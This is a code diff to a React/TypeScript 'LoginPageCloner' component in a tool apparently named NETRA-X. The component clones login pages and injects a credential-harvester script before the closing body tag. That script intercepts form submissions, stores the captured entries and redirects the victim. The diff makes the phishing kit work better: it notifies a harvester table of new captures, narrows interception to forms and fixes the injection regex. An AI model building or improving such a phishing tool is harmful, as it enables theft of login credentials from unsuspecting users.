@@ -44,6 +44,13 @@ const getHarvesterScript = (redirectUrl: string) => `
                     const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                     const updatedData = [...existingData, entry];
                     localStorage.setItem(storageKey, JSON.stringify(updatedData));
+                    
+                    // Fire a custom event to notify other components (like the harvester table)
+                    window.dispatchEvent(new StorageEvent('storage', {
+                        key: storageKey,
+                        newValue: JSON.stringify(updatedData)
+                    }));
+
                 } catch(e) {
                     console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                 }
@@ -58,9 +65,11 @@ const getHarvesterScript = (redirectUrl: string) => `
     }
 
     document.addEventListener('submit', function(e) {
-        e.preventDefault();
-        e.stopPropagation();
-        captureAndRedirect(e.target);
+        if (e.target && e.target.tagName === 'FORM') {
+            e.preventDefault();
+            e.stopPropagation();
+            captureAndRedirect(e.target);
+        }
     }, true);
 </script>
 `;
@@ -95,7 +104,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
       
     // Inject the credential harvester script before the closing body tag
     if (html.includes('</body>')) {
-      html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+      html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
     } else {
       html += harvesterScript;
     }
